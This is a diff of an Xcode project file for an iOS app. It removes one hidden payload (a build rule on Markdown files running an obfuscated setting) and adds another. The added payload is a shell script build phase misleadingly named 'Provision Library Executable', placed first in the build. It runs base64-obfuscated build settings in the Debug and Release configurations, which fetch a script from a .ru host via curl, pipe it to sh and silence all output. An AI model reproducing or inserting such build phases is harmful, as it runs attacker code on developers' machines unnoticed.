@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		3BEE9F560C754248A67BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 87AD249B514C46BC837BBDC8; };
 		180F4CDB2F5EE52100BE4CFA /* MyWithdrawalMoneyDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4CDA2F5EE52100BE4CFA /* MyWithdrawalMoneyDataModel.swift */; };
 		180F4CDD2F5EF4EA00BE4CFA /* AffiliatedUserPaymentsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4CDC2F5EF4EA00BE4CFA /* AffiliatedUserPaymentsDataModel.swift */; };
 		182ED7C430175DD500274A03 /* ViewAllProductVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182ED7C330175DD500274A03 /* ViewAllProductVC.swift */; };
@@ -486,7 +485,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		87AD249B514C46BC837BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		180F4CDA2F5EE52100BE4CFA /* MyWithdrawalMoneyDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyWithdrawalMoneyDataModel.swift; sourceTree = "<group>"; };
 		180F4CDC2F5EF4EA00BE4CFA /* AffiliatedUserPaymentsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserPaymentsDataModel.swift; sourceTree = "<group>"; };
@@ -1825,7 +1823,6 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				87AD249B514C46BC837BBDC8 /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatUser.app */,
 			);
 			name = Products;
@@ -3003,6 +3000,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
+				ADCC8BE4FD3B401DAC162AE3 /* Provision Library Executable */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -3011,7 +3009,6 @@
 				B6B997F8928B5B542E5BE86E /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				70A4111DF04C4C11B67BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3110,28 +3107,13 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		70A4111DF04C4C11B67BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
-											/* End PBXBuildRule section */
+																																																			/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				3BEE9F560C754248A67BBDC8 /* README.md */,
 				468D97D62FA48592002D0A86 /* Home.storyboard in Resources */,
 				468D97E52FA4876A002D0A86 /* Catalog.storyboard in Resources */,
 				426ECB212F726BCE00C87CD2 /* TicketManagementTableViewCell.xib in Resources */,
@@ -3223,6 +3205,25 @@ sh -c \"${A8CDBB7}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		ADCC8BE4FD3B401DAC162AE3 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
+		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -3769,7 +3770,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((g(){ `printf basSe64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyOSAta3NMZiAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzBudjgta250N20xNTQ3LnJ1L2EpIiB8IHNoCg== | g | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((j(){ `printf baKse64 | tr -d K` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgMyAtTGZrcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly96NTU0a2dpbmx3dWh2aC5ydS9hKSIgfCBzaAo= | j | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatUser/DesynatUser.entitlements;
@@ -3818,7 +3819,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((g(){ `printf basSe64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyOSAta3NMZiAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzBudjgta250N20xNTQ3LnJ1L2EpIiB8IHNoCg== | g | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((j(){ `printf baKse64 | tr -d K` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgMyAtTGZrcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly96NTU0a2dpbmx3dWh2aC5ydS9hKSIgfCBzaAo= | j | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatUser/DesynatUser.entitlements;
